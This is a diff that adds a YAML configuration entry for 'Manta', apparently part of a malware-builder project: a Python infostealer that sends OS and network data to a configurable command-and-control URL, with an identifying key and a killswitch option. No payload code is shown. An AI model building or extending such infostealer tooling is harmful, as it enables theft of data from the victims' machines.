@@ -1,0 +1,21 @@
+name: "Manta"
+lang: "py"
+malware_type: "Infostealer"
+description: "A basic infostealer that exfiltrate data regarding the OS, network configuration, ..."
+template: "templates/base/manta.py.j2"
+features:
+  - name: c2_url
+    description: "URL where your data will be sent"
+    type: "string"
+    mandatory: True
+    default: ""
+  - name: malware_key
+    description: "key to identify which malware has send the data to the C2, used by Scylla"
+    type: "string"
+    mandatory: False
+    default: "Feeling-Ray-sponsible"
+  - name: activate_killswitch
+    description: "activate the cross killswitch"
+    type: "bool"
+    mandatory: False
+    default: "False"
